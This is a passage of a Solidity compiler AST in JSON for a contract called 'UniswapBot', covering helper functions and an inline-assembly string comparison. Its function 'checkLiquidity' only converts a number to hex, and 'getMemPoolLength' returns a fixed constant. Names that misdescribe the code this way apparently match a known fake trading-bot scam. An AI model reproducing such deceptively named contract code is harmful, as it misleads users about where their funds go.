														"overloadedDeclarations": [],
														"referencedDeclaration": 1503,
														"src": "10305:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1507,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10310:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "10305:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1517,
												"nodeType": "WhileStatement",
												"src": "10298:71:9"
											},
											{
												"assignments": [
													1519
												],
												"declarations": [
													{
														"constant": false,
														"id": 1519,
														"mutability": "mutable",
														"name": "res",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1567,
														"src": "10379:16:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1518,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "10379:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1524,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1522,
															"name": "count",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1499,
															"src": "10408:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1521,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "10398:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 1520,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "10402:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 1523,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10398:16:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10379:35:9"
											},
											{
												"body": {
													"id": 1560,
													"nodeType": "Block",
													"src": "10454:115:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1539,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1535,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1503,
																	"src": "10469:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1538,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 1536,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1493,
																		"src": "10473:1:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "%",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "3136",
																		"id": 1537,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "10477:2:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_16_by_1",
																			"typeString": "int_const 16"
																		},
																		"value": "16"
																	},
																	"src": "10473:6:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "10469:10:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1540,
															"nodeType": "ExpressionStatement",
															"src": "10469:10:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1554,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1541,
																		"name": "res",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1519,
																		"src": "10494:3:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1547,
																	"indexExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 1546,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1544,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1542,
																				"name": "count",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1499,
																				"src": "10498:5:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1543,
																				"name": "i",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1526,
																				"src": "10506:1:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "10498:9:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "-",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "31",
																			"id": 1545,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "10510:1:9",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		},
																		"src": "10498:13:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "10494:18:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1551,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1503,
																					"src": "10532:1:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1550,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "10526:5:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1549,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "10526:5:9",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1552,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "10526:8:9",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1548,
																		"name": "toHexDigit",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1911,
																		"src": "10515:10:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint8_$returns$_t_bytes1_$",
																			"typeString": "function (uint8) pure returns (bytes1)"
																		}
																	},
																	"id": 1553,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "10515:20:9",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "10494:41:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1555,
															"nodeType": "ExpressionStatement",
															"src": "10494:41:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1558,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1556,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1493,
																	"src": "10550:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 1557,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10555:2:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "10550:7:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1559,
															"nodeType": "ExpressionStatement",
															"src": "10550:7:9"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1531,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1529,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1526,
														"src": "10440:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1530,
														"name": "count",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1499,
														"src": "10442:5:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "10440:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1561,
												"initializationExpression": {
													"assignments": [
														1526
													],
													"declarations": [
														{
															"constant": false,
															"id": 1526,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 1561,
															"src": "10430:6:9",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 1525,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "10430:4:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 1528,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1527,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10437:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "10430:8:9"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1533,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": true,
														"src": "10449:3:9",
														"subExpression": {
															"argumentTypes": null,
															"id": 1532,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1526,
															"src": "10451:1:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1534,
													"nodeType": "ExpressionStatement",
													"src": "10449:3:9"
												},
												"nodeType": "ForStatement",
												"src": "10425:144:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1564,
															"name": "res",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1519,
															"src": "10596:3:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1563,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "10589:6:9",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1562,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "10589:6:9",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1565,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10589:11:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1497,
												"id": 1566,
												"nodeType": "Return",
												"src": "10582:18:9"
											}
										]
									},
									"documentation": null,
									"id": 1568,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "checkLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1494,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1493,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1568,
												"src": "10192:6:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1492,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "10192:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10191:8:9"
									},
									"returnParameters": {
										"id": 1497,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1496,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1568,
												"src": "10223:13:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1495,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "10223:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10222:15:9"
									},
									"scope": 2159,
									"src": "10168:440:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1575,
										"nodeType": "Block",
										"src": "10674:31:9",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "3332363837",
													"id": 1573,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "10692:5:9",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_32687_by_1",
														"typeString": "int_const 32687"
													},
													"value": "32687"
												},
												"functionReturnParameters": 1572,
												"id": 1574,
												"nodeType": "Return",
												"src": "10685:12:9"
											}
										]
									},
									"documentation": null,
									"id": 1576,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolLength",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1569,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10642:2:9"
									},
									"returnParameters": {
										"id": 1572,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1571,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1576,
												"src": "10668:4:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1570,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "10668:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10667:6:9"
									},
									"scope": 2159,
									"src": "10617:88:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1625,
										"nodeType": "Block",
										"src": "11080:592:9",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1589,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1585,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1578,
															"src": "11095:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1586,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "11095:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1587,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1580,
															"src": "11107:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1588,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "11107:11:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "11095:23:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1593,
												"nodeType": "IfStatement",
												"src": "11091:67:9",
												"trueBody": {
													"id": 1592,
													"nodeType": "Block",
													"src": "11120:38:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1590,
																"name": "self",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1578,
																"src": "11142:4:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																	"typeString": "struct UniswapBot.slice memory"
																}
															},
															"functionReturnParameters": 1584,
															"id": 1591,
															"nodeType": "Return",
															"src": "11135:11:9"
														}
													]
												}
											},
											{
												"assignments": [
													1595
												],
												"declarations": [
													{
														"constant": false,
														"id": 1595,
														"mutability": "mutable",
														"name": "equal",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1625,
														"src": "11171:10:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1594,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "11171:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1597,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 1596,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "11184:4:9",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11171:17:9"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1602,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1598,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1578,
															"src": "11203:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1599,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 615,
														"src": "11203:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1600,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1580,
															"src": "11216:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1601,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 615,
														"src": "11216:11:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "11203:24:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1605,
												"nodeType": "IfStatement",
												"src": "11199:327:9",
												"trueBody": {
													"id": 1604,
													"nodeType": "Block",
													"src": "11229:297:9",
													"statements": [
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "11253:262:9",
																"statements": [
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11272:27:9",
																		"value": {
																			"arguments": [
																				{
																					"name": "needle",
																					"nodeType": "YulIdentifier",
																					"src": "11292:6:9"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11286:5:9"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11286:13:9"
																		},
																		"variables": [
																			{
																				"name": "length",
																				"nodeType": "YulTypedName",
																				"src": "11276:6:9",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11317:37:9",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "self",
																							"nodeType": "YulIdentifier",
																							"src": "11342:4:9"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "11348:4:9",
																							"type": "",
																							"value": "0x20"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "11338:3:9"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11338:15:9"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11332:5:9"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11332:22:9"
																		},
																		"variables": [
																			{
																				"name": "selfptr",
																				"nodeType": "YulTypedName",
																				"src": "11321:7:9",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11372:41:9",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "needle",
																							"nodeType": "YulIdentifier",
																							"src": "11399:6:9"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "11407:4:9",
																							"type": "",
																							"value": "0x20"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "11395:3:9"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11395:17:9"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11389:5:9"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11389:24:9"
																		},
																		"variables": [
																			{
																				"name": "needleptr",
																				"nodeType": "YulTypedName",
																				"src": "11376:9:9",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "11431:69:9",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "selfptr",
																							"nodeType": "YulIdentifier",
																							"src": "11453:7:9"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "11462:6:9"
																						}
																					],
																					"functionName": {
																						"name": "keccak256",
																						"nodeType": "YulIdentifier",
																						"src": "11443:9:9"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11443:26:9"
																				},
																				{
																					"arguments": [
																						{
																							"name": "needleptr",
																							"nodeType": "YulIdentifier",
																							"src": "11481:9:9"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "11492:6:9"
																						}
																					],
																					"functionName": {
																						"name": "keccak256",
																						"nodeType": "YulIdentifier",
																						"src": "11471:9:9"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11471:28:9"
																				}
																			],
																			"functionName": {
																				"name": "eq",
																				"nodeType": "YulIdentifier",
																				"src": "11440:2:9"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11440:60:9"
																		},
																		"variableNames": [
																			{
																				"name": "equal",
																				"nodeType": "YulIdentifier",
																				"src": "11431:5:9"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 1595,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11431:5:9",
																	"valueSize": 1
																},
																{
																	"declaration": 1580,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11292:6:9",
																	"valueSize": 1
																},
																{
																	"declaration": 1580,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11399:6:9",
																	"valueSize": 1
																},
																{
																	"declaration": 1578,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11342:4:9",
																	"valueSize": 1
																}
															],
															"id": 1603,
															"nodeType": "InlineAssembly",
															"src": "11244:271:9"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1606,
													"name": "equal",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1595,
													"src": "11543:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1622,
												"nodeType": "IfStatement",
												"src": "11539:101:9",
												"trueBody": {
													"id": 1621,
													"nodeType": "Block",
													"src": "11550:90:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1612,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1607,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1578,
																		"src": "11565:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
